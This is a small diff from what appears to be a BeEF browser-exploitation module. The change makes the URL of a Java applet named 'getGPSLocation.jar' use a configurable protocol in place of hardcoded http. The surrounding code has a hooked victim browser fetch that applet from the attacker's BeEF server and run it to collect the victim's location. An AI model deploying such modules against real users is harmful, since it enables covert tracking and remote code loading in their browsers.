@@ -5,7 +5,7 @@
  */
 
 beef.execute(function() {
-    var applet_archive = 'http://'+beef.net.host+ ':' + beef.net.port + '/getGPSLocation.jar';
+    var applet_archive = beef.net.httpproto + '://'+beef.net.host+ ':' + beef.net.port + '/getGPSLocation.jar';
     var applet_id = '<%= @applet_id %>';
     var applet_name = '<%= @applet_name %>';
     var output;
